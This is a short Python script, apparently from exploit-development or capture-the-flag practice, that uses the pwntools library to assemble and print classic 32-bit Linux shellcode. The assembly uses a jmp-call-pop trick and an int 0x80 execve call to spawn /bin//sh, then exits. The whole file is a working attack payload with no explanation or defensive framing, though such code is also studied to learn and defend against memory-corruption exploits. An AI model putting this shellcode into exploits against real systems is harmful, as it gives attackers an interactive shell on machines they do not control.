from pwn import *

sc='''
_start:
    jmp string
shellcode:
    pop ebx
    xor eax,eax
    push eax
    mov ecx,eax
    mov edx,eax
    mov al,0xb
    int 0x80
    xor eax,eax
    inc eax
    int 0x80 

string:
    call shellcode
    .string "/bin//sh"
'''

print (asm(sc))